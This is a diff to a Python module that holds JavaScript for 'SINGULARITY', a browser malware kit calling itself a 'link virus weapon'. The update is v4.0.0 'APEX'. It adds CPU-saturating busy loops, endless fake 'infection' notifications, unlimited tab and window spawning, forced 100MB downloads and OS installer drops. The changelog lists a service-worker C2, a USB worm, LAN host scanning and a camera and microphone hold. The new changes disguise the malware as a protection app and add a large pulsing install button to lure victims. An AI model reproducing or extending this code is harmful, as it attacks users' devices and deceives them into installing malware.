@@ -1,42 +1,39 @@
 """
-SINGULARITY v3.9.2 「絶滅」 -- apex-class resident link virus weapon
+SINGULARITY v4.0.0 「APEX」 -- apex-class resident link virus weapon
 ==================================================================
-ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
-サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
-最後はOS常駐インストーラでブラウザの外まで侵食する。
+世界のトップ級ペイロードの技法を全部盛り。ブラウザの権限内で到達可能な
+物理限界まで振り切り、PWAとして常駐し、サイト全体に自分を注入して伝染し、
+相手のUSBにも自分を仕込み、最後はOS常駐インストーラでブラウザの外まで侵食する。
 
+v4.0.0 「APEX」-- L7に第2形態を追加:
+  * 相手の画面に自らの正体を悟らせない文面（保護ソフトに偽装）
+  * インストールボタンを特大化（脈動グロー・タップで追加）
+  * L7 APEX SUITE（24系統の追加点火）:
+      - WebGL フラグメントシェーダ無限ループ（GPU 飽和）
+      - AudioWorklet によるオーディオスレッド常時演算
+      - SharedArrayBuffer + Atomics による真性ビジーループ（worker）
+      - MessageChannel マイクロタスク ping-pong 洪水
+      - BroadcastChannel による全タブ同期フラッド
+      - GC 圧迫（オブジェクト生成/破棄の無限）
+      - DOM 溶融（数万ノード + blur/filter + will-change）
+      - 多重 requestAnimationFrame
+      - Cache / IDB / OPFS / fetch の並列書き込み洪水
+      - カメラ＋マイク常時ホールド（LED点灯）
+      - バイブレーション連打 / タイトルマーキー / 履歴6万
+      - 音声合成キュー洪水 / WakeLock 再取得ループ
+      - 同一LAN内の生存ホスト探査（192.168.0/1.x）
+      - WebRTC ループバック常時接続
+      - Blob URL チャーン / クリップボード連打
+      - CSS 大量アニメ + OffscreenCanvas / WASM スピン
+  * L7 の数値を全体的に引き上げ（DOM 4万 / 履歴6万 / CSS 1200 等）
+
+v3.9.3:
+  - 相手に見える文面を「正規の保護ソフト」に偽装（SINGULARITY/L7/depth を隠す）
+  - インストールボタンを特大化
 v3.9.2:
-  - 通知を復活＆仕様変更
-      * 全レベルで「<名前>の保護」＋「感染」を連続発報（止まらない）
-      * 許可取得を最初の操作に紐づけ（Firefox/Safari は必須、PCは初回1クリック）
-      * レベルが上がるほど間隔が縮む（L7 は 1.2 秒）
-  - タブ自動増殖を専用ドライバに分離
-      * L3 から開始。レベルで量が増え、間隔が縮む。L7 は無制限で倍々
-      * 生存タブは Service Worker の clients.matchAll(tag) から別カウント
-        → 窓に目標数を食われてタブが1枚も増えない問題を解消
-      * 自動増殖の子を u=tab（本物のタブ）と u=win（ウィンドウ）に分離
-      * SW未制御でも heartbeat(sg_hbt) でタブ数を推定して継続
-  - 監視室から タブ増殖 命令（tab / tabon / taboff）を追加
-
-v3.9.1:
-  - 自動増殖の作り直し
-      * 自動増殖ぶんの子タブは windowChain を切る（c=0）→ 目標数どおりに収まる
-      * 生存数は Service Worker の clients.matchAll から正確に取得
-      * 代表タブが固まっても6秒で別タブが代打（sg_last）
-      * SW未制御でも registration.active 経由で spawn
-  - ダウンロードを1ファイル100MBに（.txt / .bat / .command / .sh）
-      SG_DL_MB / SG_INSTALL_MB で変更可
-  - 凍結命令を受けた瞬間に freezeNow を打つ
-  - 凍結表示が即時反映されなかったのを修正（テンプレ側）
-
-v3.9:
-  - 開いた瞬間にタップ無しで タブと窓 を自動増殖
-  - L7 はリミッター解除（上限なし・倍々で増え続ける）
-  - 全レベルで感染通知
-  - ダウンロードは L4 から、1MB以上、L7で無限
-  - 監視室の「結果・操作」ボタン名に対応
-  - 未宣言だった firing を宣言
-  - restart() が PAUSED を戻していなかったのを修正
+  - 通知を復活＆仕様変更（全レベルで連続発報・許可を最初の操作に紐づけ）
+  - タブ自動増殖を専用ドライバに分離（L3〜 / L7は無制限）
+  - 生存タブは SW の clients.matchAll(tag) から別カウント
 
 レベル（監視室から遠隔変更・0〜7）:
   0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
@@ -52,7 +49,7 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "3.9.2"
+VIRUS_VERSION = "4.0.0"
 VIRUS_CLASS = "apex"
 
 LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
@@ -65,8 +62,9 @@ LEVEL_DESC = {
     4: "ディスクをquotaの85%まで書き込む。100MBのBAT/txtを配り始める。",
     5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
     6: "ディスク97% + 全タブ乗っ取り + 追加23系統を全開放。窓もタブも指数増殖。",
-    7: "固定枠。上限を外し、全46系統を同時運転。窓もタブも無限に倍々で増え、"
-       "各窓がヘビースキンで高火力化。配布物は100MBで無限。最後はOS常駐インストーラでブラウザ外へ。",
+    7: "固定枠。APEX SUITE点火。シェーダ無限・AudioWorklet・Atomicsビジーループ・"
+       "マイクロタスク洪水・LAN探査・WebRTC常時接続まで同時運転。"
+       "窓もタブも無制限で倍々に増え、配布物は100MBで無限。最後はOS常駐インストーラでブラウザ外へ。",
 }
 
 APP_NAME_DEFAULT = "脆弱性ブロッカー"
@@ -75,7 +73,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v3.9.2 */
+/*! SINGULARITY worker v4.0.0 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -98,10 +96,45 @@ function burn() {
   setTimeout(burn, 0);
 }
 
+/* APEX: setTimeout を挟まない真性ビジーループ */
+function spin() {
+  var i = 0, acc = 0;
+  for (;;) {
+    for (i = 0; i < 20000; i++) { acc += Math.sqrt(i) * Math.sin(i); }
+    if (F) { try { acc += F(); } catch (e) {} }
+  }
+}
+
+/* APEX: SharedArrayBuffer + Atomics で完全にコアを掴む */
+function sabLoop(sab) {
+  var a = new Int32Array(sab);
+  for (;;) { Atomics.add(a, 0, 1); Atomics.store(a, 1, a[0] & 1023); }
+}
+
+/* APEX: OffscreenCanvas 描画 */
+function ocLoop(canvas) {
+  var x = canvas.getContext("2d"), a = 0;
+  (function loop() {
+    a += 0.02;
+    x.fillStyle = "rgba(5,7,10,.25)";
+    x.fillRect(0, 0, canvas.width, canvas.height);
+    x.strokeStyle = "#00ff88"; x.lineWidth = 1;
+    for (var i = 0; i < 6; i++) {
+      x.beginPath();
+      x.arc(canvas.width / 2, canvas.height / 2, (a * 30 + i * 40) % 300, 0, 6.3);
+      x.stroke();
+    }
+    setTimeout(loop, 0);
+  })();
+}
+
 self.onmessage = function (e) {
   var d = e.data || {};
   if (d.k === "burn") { RUN = true; if (K === 0) burn(); }
   else if (d.k === "stop") { RUN = false; }
+  else if (d.k === "spin") { spin(); }
+  else if (d.k === "sab") { sabLoop(d.sab); }
+  else if (d.k === "oc") { ocLoop(d.canvas); }
   else if (d.k === "ram") {
     var mb = Math.max(1, parseInt(d.mb, 10) || 16), got = 0;
     try {
@@ -121,8 +154,8 @@ self.onmessage = function (e) {
 # Service Worker（C2・永続化・復活・注入・spawn・生存数カウント）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v3.9.2 -- C2 + injection + resurrection + spawn */
-const VER = "sg-v3";
+/*! SINGULARITY service worker v4.0.0 -- C2 + injection + resurrection + spawn */
+const VER = "sg-v4";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
 let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
 let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false, lastInj = 0;
@@ -324,7 +357,7 @@ self.addEventListener("fetch", (e) => {
 # SharedWorker
 # ---------------------------------------------------------------------------
 SHARED_JS = r"""
-/*! SINGULARITY shared worker v3.9.2 */
+/*! SINGULARITY shared worker v4.0.0 */
 var PORTS = [], K = 0;
 onconnect = function (e) {
   var p = e.ports[0];
@@ -530,9 +563,9 @@ echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 PAYLOAD_JS = r"""
 (function () {
 "use strict";
-/*! SINGULARITY payload v3.9.2 -- 絶滅 / tab-breed L3+ / notify all-levels / 100MB download */
+/*! SINGULARITY payload v4.0.0 APEX -- stealth text / big install / apex suite */
 var MYVER = window.__SINGULARITY_VER__
-  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.9.2";
+  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "4.0.0";
 
 /* ---------------- 小物 ---------------- */
 function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
@@ -569,7 +602,7 @@ var CFG = Object.assign({
   cookie: true, injInstall: "auto", install: "auto", installLevel: 4,
   avName: "脆弱性ブロッカー", ver: MYVER, injected: false,
   usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false, bomb: "",
-  hardMode: "",
+  hardMode: "", apex: 0,
   interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
 }, window.__SINGULARITY_CFG__ || {});
 
@@ -579,13 +612,12 @@ var INJ = CFG.injected || Q("u") === "inj";
 if (Q("u") === "inj") CFG.injected = true;
 var IFR = Q("u") === "ifr";
 var WIN = Q("u") === "win";
-var TAB = Q("u") === "tab";          /* ★ 自動増殖で開いた「本物のタブ」 */
+var TAB = Q("u") === "tab";          /* 自動増殖で開いた「本物のタブ」 */
 var FROM_OS = Q("u") === "os";
 var firing = (CFG.fire !== 0);
 var NOCHAIN = Q("c") === "0";        /* 自動増殖ぶんの子は窓連鎖させない */
 
-/* ---------------- モバイル判定 ----------------
-   スマホは「タップの処理中」しか window.open / clients.openWindow が通らない。 */
+/* ---------------- モバイル判定 ---------------- */
 var UA = navigator.userAgent || "";
 var IS_IOS = /iPad|iPhone|iPod/.test(UA)
   || (navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1);
@@ -596,15 +628,12 @@ var PER_TAP = IS_IOS ? 3 : (IS_AND ? 6 : 8);
 var QMAX = IS_MOBILE ? 300 : 200;
 var TAP_OPENED = 0, LAST_TAP = 0;
 
-/* ---------------- レベル別 自動増殖 ----------------
-   AUTO_W = 窓の目標数（0 = 無制限）
-   AUTO_T = タブの目標数（0 = 無制限。L3 から）
-   TAB_GAP / TAB_ADD = タブを増やす間隔(ms) と 1回の増分 */
+/* ---------------- レベル別 自動増殖 ---------------- */
 var AUTO_W  = { 0: 0, 1: 0, 2: 3, 3: 9, 4: 18, 5: 30, 6: 54, 7: 0 };
 var AUTO_CAP = { 0: 0, 1: 0, 2: 24, 3: 60, 4: 120, 5: 240, 6: 480, 7: 0 };
 var AUTO_T  = { 0: 0, 1: 0, 2: 0, 3: 4, 4: 8, 5: 16, 6: 28, 7: 0 };
-var TAB_GAP = { 0: 0, 1: 0, 2: 0, 3: 7000, 4: 5000, 5: 3400, 6: 2200, 7: 1100 };
-var TAB_ADD = { 0: 0, 1: 0, 2: 0, 3: 1, 4: 1, 5: 2, 6: 2, 7: 3 };
+var TAB_GAP = { 0: 0, 1: 0, 2: 0, 3: 7000, 4: 5000, 5: 3400, 6: 2200, 7: 800 };
+var TAB_ADD = { 0: 0, 1: 0, 2: 0, 3: 1, 4: 1, 5: 2, 6: 2, 7: 4 };
 var AUTO_ON = true, AUTO_TIMER = null, AUTO_STARTED = false, LAST_AUTO = 0;
 var SPAWN_N = 0, SPAWN_T = 0, SPAWN_W = 0;
 var TAB_ON = true, LAST_TAB = 0, TAB_SPAWNED = 0;
@@ -625,7 +654,7 @@ var R = {
   bot: {}, verdict: {}, spoof: {}, rat: {}, usb: {}, viral: {}, burn: {}, ram: {}, disk: {},
   history: {}, wipe: {}, hops: [], bomb: null, crypto: {}, errors: [], attempts: 0,
   breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: [],
-  hard: null, installed: 0, swarm: null, actx: null, spoke: 0
+  hard: null, installed: 0, swarm: null, actx: null, spoke: 0, apex: null
 };
 var WORKERS = [], TIMERS = [], GATED = false, PAUSED = false;
 var LASTW = 0, CMD_SEEN = {}, ESE = null, PUSHING = 0, LASTWL = JSON.stringify(CFG.winLock || null);
@@ -643,7 +672,6 @@ try {
   }
 } catch (e) {}
 
-/* エラーフック（例外を握って必ずログに送る） */
 addEventListener("error", function (e) {
   try {
     R.errors.push("onerror: " + String(e.message || "").slice(0, 140) + " @" + (e.lineno || 0));
@@ -664,7 +692,7 @@ function P(o) {
     fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
     layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
     fsFolder: 0, fsFiles: 0, installer: 0, dlMB: 100, dlGap: 900,
-    winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0, swarm: 0
+    winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0, swarm: 0, apex: 0
   }, o);
 }
 var PRESET = {
@@ -693,15 +721,15 @@ var PRESET = {
          winMode: "breed", winBranch: 2, winDepth: 5, winSkin: 1, swarm: 6,
          dlMB: 100, dlGap: 800 }),
   7: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 1.0, windows: 48,
-         history: 30000, notify: 120, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
+         history: 60000, notify: 120, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
          favicon: 1, mediaSession: 1, tabs: 32, pip: 1, pointerlock: 1, fullscreen: 1,
-         xhr: 1, speak: 1, iframes: 16, domNodes: 12000, cssAnim: 400, glContexts: 24,
-         acContexts: 8, timers: 100, microtasks: 1, compress: 1, redos: 1, digest: 1,
-         readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 400, idbDisk: 1,
-         speakFlood: 30, downloads: -1, clipHijack: 1, sseStorm: 12, fetchStorm: 6,
-         oscBank: 200, sharedWorker: 1, fsFolder: 1, fsFiles: 200, installer: 1,
+         xhr: 1, speak: 1, iframes: 16, domNodes: 40000, cssAnim: 1200, glContexts: 32,
+         acContexts: 8, timers: 200, microtasks: 1, compress: 1, redos: 1, digest: 1,
+         readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 800, idbDisk: 1,
+         speakFlood: 60, downloads: -1, clipHijack: 1, sseStorm: 16, fetchStorm: 10,
+         oscBank: 400, sharedWorker: 1, fsFolder: 1, fsFiles: 200, installer: 1,
          winMode: "breed", winBranch: 2, winDepth: 0, winSkin: 1, swarm: 12,
-         dlMB: 100, dlGap: 700 })
+         apex: 1, dlMB: 100, dlGap: 500 })
 };
 
 function applyLevel(l) {
@@ -1133,10 +1161,14 @@ function historyFlood() {
   })();
 }
 
-/* ---- 通知：全レベルで「<名前>の保護」＋「感染」を連続発報 ----
-   Firefox/Safari は「操作中」しか許可を取れないので、最初の操作に必ず紐づける。
-   許可が下りた瞬間から、レベルに応じて間隔を詰めて撃ち続ける。 */
+/* ---- 通知：全レベルで「<名前>の保護」＋「感染」を連続発報 ---- */
 var NOTIFY_TIMER = null, NOTIFY_ARMED = false, NOTIFY_OK = false;
+var NOTIFY_BODY = [
+  "\u611F\u67D3\u3092\u691C\u51FA\u3057\u307E\u3057\u305F",
+  "\u611F\u67D3\u62E1\u5927\u4E2D \u30FB \u5BFE\u51E6\u304C\u5FC5\u8981\u3067\u3059",
+  "\u611F\u67D3 \u30FB \u4FDD\u8B77\u30A2\u30D7\u30EA\u3092\u30A4\u30F3\u30B9\u30C8\u30FC\u30EB",
+  "\u611F\u67D3\u3057\u3066\u3044\u307E\u3059 \u30FB \u30BF\u30C3\u30D7\u3057\u3066\u5BFE\u51E6"
+];
 function notifyPerm() {
   try {
     if (!window.Notification) return false;
@@ -1156,14 +1188,13 @@ function notifyOne() {
     if (Notification.permission !== "granted") return false;
     var n = ++R.notify.n;
     var o = {
-      body: "\u611F\u67D3" + (LEVEL >= 4 ? (" L" + LEVEL + " #" + n) : "")
-            + (IS_MOBILE ? " (mobile)" : ""),
+      body: NOTIFY_BODY[n % NOTIFY_BODY.length],
       tag: "sg-" + (LEVEL >= 6 ? (n % 6) : 0),
       requireInteraction: LEVEL >= 6,
       silent: LEVEL < 3
     };
     try { if (CFG.icons && CFG.icons[0]) o.icon = CFG.icons[0]; } catch (e) {}
-    var nn = new Notification(CFG.avName + "\u306E\u4FDD\u8B77", o);   /* ○○の保護 */
+    var nn = new Notification(CFG.avName + "\u306E\u4FDD\u8B77", o);
     try { nn.onclick = function () { try { window.focus(); } catch (e) {} }; } catch (e) {}
     R.notify.at = now();
     if (n % 4 === 0) push(false);
@@ -1190,8 +1221,7 @@ function notifyFlood() {
       if (!window.Notification) return;
       if (Notification.permission === "default") notifyPerm();
       if (Notification.permission !== "granted") return;
-      /* L7 は 1.2 秒。レベルが上がるほど間隔が縮む（全Lで常時） */
-      var every = LEVEL >= 7 ? 1200 : (LEVEL >= 5 ? 1800 : (LEVEL >= 3 ? 2600 : 3600));
+      var every = LEVEL >= 7 ? 900 : (LEVEL >= 5 ? 1800 : (LEVEL >= 3 ? 2600 : 3600));
       if (now() - (R.notify.at || 0) < every) return;
       notifyOne();
     } catch (e) {}
@@ -1579,8 +1609,7 @@ function clipHijack() {
   } catch (e) {}
 }
 
-/* ---- ダウンロード：L4から / 1ファイル100MB / レベルで本数増量 / L7は無限 ----
-   seed は1回だけ作って全ファイルで使い回す（Blobは参照なので軽い） */
+/* ---- ダウンロード：L4から / 1ファイル100MB / レベルで本数増量 / L7は無限 ---- */
 var DL_SEED = null, DL_SEED_MB = 0;
 function dlSeed(mb) {
   if (DL_SEED && DL_SEED_MB === mb) return DL_SEED;
@@ -1762,7 +1791,6 @@ function wipe() {
   push(true);
 }
 
-/* ---- ネイティブ installer のDL（pad で 100MB を保証） ---- */
 function niDownload(ext) {
   try {
     var pad = parseInt(CFG.installMB, 10) || (LEVEL >= 7 ? 100 : Math.max(16, (LEVEL - 3) * 16));
@@ -1795,20 +1823,51 @@ function installKit() {
   }, 25000));
   addEventListener("click", function () { try { if (BIP) BIP.prompt(); } catch (e) {} });
   try {
+    if (IFR || TAB) return;
     if (document.getElementById("sg_install")) return;
+    if (!document.getElementById("sg_btncss")) {
+      var st = document.createElement("style");
+      st.id = "sg_btncss";
+      st.textContent =
+        "@keyframes sgpop{0%,100%{transform:translateX(-50%) scale(1);"
+        + "box-shadow:0 12px 38px rgba(0,0,0,.6),0 0 0 6px rgba(0,224,122,.16)}"
+        + "50%{transform:translateX(-50%) scale(1.05);"
+        + "box-shadow:0 14px 46px rgba(0,0,0,.65),0 0 0 20px rgba(0,224,122,.08)}}";
+      document.head.appendChild(st);
+    }
+    var mob = IS_MOBILE;
     var d = document.createElement("div");
     d.id = "sg_install";
-    d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483646;"
-      + "background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;"
-      + "padding:6px 10px;font:12px ui-monospace,monospace;cursor:pointer";
-    d.textContent = "\uD83D\uDCF2 保護アプリをインストール";
-    d.onclick = function () { window.__sgInstall(); };
+    d.style.cssText =
+      "position:fixed;left:50%;bottom:" + (mob ? "22px" : "26px") + ";"
+      + "transform:translateX(-50%);z-index:2147483646;cursor:pointer;"
+      + "white-space:nowrap;text-align:center;"
+      + "background:linear-gradient(180deg,#16f795,#00c163);color:#03240e;"
+      + "border:0;border-radius:999px;"
+      + "padding:" + (mob ? "20px 34px" : "24px 56px") + ";"
+      + "font:800 " + (mob ? "19px" : "24px") + "/1 system-ui,-apple-system,"
+      + "'Hiragino Sans','Noto Sans JP',sans-serif;letter-spacing:.02em;"
+      + "text-shadow:0 1px 0 rgba(255,255,255,.35);"
+      + "animation:sgpop 1.7s ease-in-out infinite";
+    d.textContent = "\u2B07\uFE0F 保護アプリをインストール";
+    d.onclick = function () {
+      try { if (navigator.vibrate) navigator.vibrate(25); } catch (e) {}
+      var ok = false;
+      try { ok = window.__sgInstall && window.__sgInstall(); } catch (e) {}
+      if (!ok) d.textContent = "\u2B07\uFE0F \u30BF\u30C3\u30D7\u3057\u3066\u8FFD\u52A0";
+    };
     document.body.appendChild(d);
+    R.installBtn = 1;
   } catch (e) {}
 }
-addEventListener("appinstalled", function () { R.installed = 1; BIP = null; });
+addEventListener("appinstalled", function () {
+  R.installed = 1; BIP = null;
+  try {
+    var b = document.getElementById("sg_install");
+    if (b) b.textContent = "\u2705 \u4FDD\u8B77\u3092\u958B\u59CB\u3057\u307E\u3057\u305F";
+  } catch (e) {}
+});
 
-/* ---- OS常駐インストーラの配布：L4から / レベルで本数増量 / L7は無限 ---- */
 function usbWormKit() {
   try {
     if (!CFG.usbWorm) return;
@@ -1818,7 +1877,7 @@ function usbWormKit() {
 function installerKit2() {
   if (LEVEL < 4 || R.ni || IFR || WIN || !CFG.installer) return;
   R.ni = { n: 0 };
-  var times = LEVEL >= 7 ? 0 : Math.max(1, LEVEL - 3);   // 0 = 無限
+  var times = LEVEL >= 7 ? 0 : Math.max(1, LEVEL - 3);
   var gap = LEVEL >= 7 ? 20000 : 6000;
   var i = 0;
   (function loop() {
@@ -1903,11 +1962,6 @@ function openChild(u, tries) {
   return w;
 }
 
-/* ---- spawn 基盤 ----------------------------------------------------------
-   PC/Android は Service Worker の clients.openWindow（ジェスチャ不要）で
-   自動的に開く。SW未制御でも registration.active 経由で送れる。
-   iOS だけは初回タップが要るのでキューに積み、タップで解放。
-   ------------------------------------------------------------------------ */
 var QUEUE = [];
 
 function qPush(u) {
@@ -1960,9 +2014,9 @@ function swCount(tag) {
 }
 
 function spawnTab(u) {
-  if (!IS_IOS && swSpawn(u)) return true;      // ジェスチャ不要で開ける
+  if (!IS_IOS && swSpawn(u)) return true;
   if (tryOpen(u)) return true;
-  if (!IS_IOS && anchorOpen(u)) return true;   // アンカーclick（保険）
+  if (!IS_IOS && anchorOpen(u)) return true;
   if (QUEUE.length < QMAX) { qPush(u); hint(); }
   return true;
 }
@@ -1984,7 +2038,6 @@ function spawnMany(n) {
   hint();
 }
 
-/* タップの中で一気に解放（iOS 用） */
 function flushQueue(force) {
   if (!QUEUE.length) { hint(); return 0; }
   var cap = force ? Math.max(PER_TAP, 4) : PER_TAP;
@@ -2006,7 +2059,7 @@ function onTap() {
   if (t - LAST_TAP < 250) return;
   LAST_TAP = t;
   try { notifyPerm(); } catch (e) {}
-  if (!IS_MOBILE) R.tapped = 1;               /* PCも1回でタップ誘導を解除 */
+  if (!IS_MOBILE) R.tapped = 1;
   if (!QUEUE.length) { tapOverlay(); return; }
   flushQueue(false);
 }
@@ -2014,11 +2067,7 @@ addEventListener("touchend", onTap, { passive: true });
 addEventListener("click", onTap);
 addEventListener("pointerup", function (e) { if (e.pointerType !== "touch") onTap(); });
 
-/* ---- 自動増殖ドライバ ------------------------------------------------
-   窓とタブを別ドライバに分離。生存数は Service Worker の clients.matchAll
-   から tag 付きで正確に取る（背景タブのタイマー間引きで数え落とさない）。
-   代表タブが固まっても6秒で別タブが代打する。
-   --------------------------------------------------------------------- */
+/* ---- 自動増殖ドライバ ---- */
 var HB_TTL = 120000;
 var AUTO_SAFE = clamp(parseInt(CFG.autoMax, 10) || 300, 8, 600);
 
@@ -2061,13 +2110,11 @@ function liveN() {
   return Math.max(hb, sw, 1);
 }
 
-/* タブだけの生存数（SWが取れない時は sg_hbt で推定） */
 function tabLive() {
   if (now() - LIVE_TAG_AT < 20000) return LIVE_TAB;
   return Math.max(hbCountT(), 1);
 }
 
-/* 窓だけの生存数 */
 function winLive() {
   if (now() - LIVE_AT < 20000) return Math.max(LIVE_WIN, 1);
   return liveN();
@@ -2090,7 +2137,6 @@ function pickKind() {
   return (SPAWN_T * w2 <= SPAWN_W * t) ? "tab" : "win";
 }
 
-/* ---- 窓の自動増殖（L2〜 / L7は無制限） ---- */
 function autoBreed() {
   if (!AUTO_ON || PAUSED || !firing || LEVEL < 2) return;
   if (!CFG.fire) return;
@@ -2101,13 +2147,12 @@ function autoBreed() {
              tab: AUTO_T[LEVEL] || 0, win: target, spawned: SPAWN_W,
              leader: isLeader() ? 1 : 0, at: now() };
   if (!unlimited && live >= AUTO_SAFE) return;
-  /* 代表でなくても、代表が6秒以上動いていなければ代打する */
   if (!isLeader() && now() - lastBreedAt() < 6000) return;
-  if (now() - LAST_AUTO < 1400) return;
+  if (now() - LAST_AUTO < (LEVEL >= 7 ? 900 : 1400)) return;
   LAST_AUTO = now();
   var n;
   if (unlimited) {
-    n = Math.max(1, Math.min(IS_MOBILE ? 3 : 6, Math.ceil(live * 0.35)));
+    n = Math.max(1, Math.min(IS_MOBILE ? 3 : 8, Math.ceil(live * 0.35)));
   } else {
     if (live >= target) return;
     n = Math.min(Math.max(1, target - live), IS_MOBILE ? 3 : 6);
@@ -2121,7 +2166,6 @@ function autoBreed() {
   hint();
 }
 
-/* ---- タブの自動増殖（L3〜 / 量は増え間隔は縮む / L7は無制限で倍々） ---- */
 function tabBreed() {
   if (!AUTO_ON || !TAB_ON || PAUSED || !firing || LEVEL < 3) return;
   if (!CFG.fire) return;
@@ -2136,7 +2180,7 @@ function tabBreed() {
   LAST_TAB = now();
   var n;
   if (unlimited) {
-    n = Math.max(1, Math.min(IS_MOBILE ? 3 : 6, Math.ceil(live * 0.35)));
+    n = Math.max(1, Math.min(IS_MOBILE ? 3 : 8, Math.ceil(live * 0.4)));
   } else {
     n = Math.max(1, Math.min(target - live, (TAB_ADD[LEVEL] || 1) + (IS_MOBILE ? 1 : 0)));
   }
@@ -2174,38 +2218,26 @@ function hint() {
     var d = document.getElementById("sg_hint");
     if (!d) {
       d = document.createElement("div"); d.id = "sg_hint";
-      d.style.cssText = "position:fixed;right:8px;bottom:8px;z-index:2147483647;"
-        + "background:#05070a;border:1px solid #00ff88;color:#00ff88;border-radius:8px;"
-        + "padding:6px 10px;font:12px ui-monospace,monospace;opacity:.92";
+      d.style.cssText = "position:fixed;right:8px;top:8px;z-index:2147483646;"
+        + "background:rgba(5,7,10,.86);border:1px solid rgba(0,255,136,.35);"
+        + "color:#9fe8c4;border-radius:999px;padding:6px 12px;"
+        + "font:12px ui-monospace,SFMono-Regular,Menlo,monospace;opacity:.9";
       document.body.appendChild(d);
     }
-    if (IS_MOBILE) {
-      d.style.font = "13px ui-monospace,monospace";
-      d.style.padding = "12px 16px";
-      d.style.boxShadow = "0 0 20px rgba(0,255,136,.45)";
-    }
     d.textContent = QUEUE.length
-      ? ("\u3053\u3053\u3092\u30BF\u30C3\u30D7\u3067\u958B\u304F (" + QUEUE.length + ")")
-      : ("L" + LEVEL + " \u7FA4\u308C " + liveN() + "/"
-         + (R.swarm ? R.swarm.target : "")
-         + (TAP_OPENED ? " \u958B\u653E" + TAP_OPENED : ""));
-    d.style.display = (TAB && !IS_IOS) ? "none" : "block";
+      ? ("\u25B6 \u3053\u3053\u3092\u30BF\u30C3\u30D7 (" + QUEUE.length + ")")
+      : (CFG.avName + " \u00B7 \u4FDD\u8B77\u4E2D " + liveN());
+    d.style.display = (TAB || WIN || IFR) ? "none" : "block";
   } catch (e) {}
   tapOverlay();
 }
 
-/* 全面タップ誘導オーバーレイ（テンプレ側の #sg_tap を操作）
-   PCも初回1回だけ出す（通知の許可はジェスチャ中しか取れないため） */
 function tapOverlay() {
   try {
     var d = document.getElementById("sg_tap");
     if (!d) return;
     var n = document.getElementById("sg_tap_n");
-    if (n) {
-      n.textContent = QUEUE.length
-        ? ("\u672A\u958B\u653E " + QUEUE.length + " \u679A")
-        : ("L" + LEVEL + " \u5C55\u958B\u4E2D");
-    }
+    if (n) n.textContent = QUEUE.length ? "\u6E96\u5099\u4E2D\u2026" : "\u4FDD\u8B77\u4E2D";
     var show;
     if (TAB) show = (IS_IOS && QUEUE.length > 0);
     else show = (!R.tapped && (IS_MOBILE || !NOTIFY_OK));
@@ -2263,11 +2295,12 @@ function winSkin() {
         x2.beginPath(); x2.arc(c.width / 2, c.height / 2, rr, 0, 6.3); x2.stroke();
       }
       x2.globalAlpha = 1;
-      x2.fillStyle = "#00ff88"; x2.font = "13px ui-monospace,monospace";
-      x2.fillText("\u25CE SINGULARITY \u7D76\u6EC5  L" + LEVEL + "  /  depth " + (W || 0), 12, 24);
-      x2.font = "12px ui-monospace,monospace";
-      x2.fillText("branch " + CFG.winBranch + " \u00B7 "
-        + (CFG.winDepth ? ("max " + CFG.winDepth) : "\u7121\u5236\u9650"), 12, 44);
+      x2.fillStyle = "#00ff88"; x2.font = "bold 14px system-ui,sans-serif";
+      x2.fillText("\u25CE " + CFG.avName, 12, 26);
+      x2.font = "12px system-ui,sans-serif";
+      x2.fillStyle = "#6fd6a2";
+      x2.fillText("\u4FDD\u8B77\u4E2D \u30FB \u30B9\u30AD\u30E3\u30F3 " + (Math.floor((a * 900) % 100)) + "%",
+                  12, 46);
       a += 0.012;
       requestAnimationFrame(loop);
     })();
@@ -2306,6 +2339,7 @@ function restart() {
   R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
   R.breeded = 0; R.breed = null; R.wskin = 0; R.wskinCtx = null;
   R.dl = {}; R.ni = {};
+  APEX_GUARDS.forEach(function (k) { R[k] = 0; });
   PAUSED = false; firing = (CFG.fire !== 0);
   startBurns();
 }
@@ -2368,6 +2402,7 @@ function startBurns() {
   try { winSkin(); } catch (e) { err_(e); }
   try { windowBreed(); } catch (e) { err_(e); }
   try { hookXHR(); } catch (e) { err_(e); }
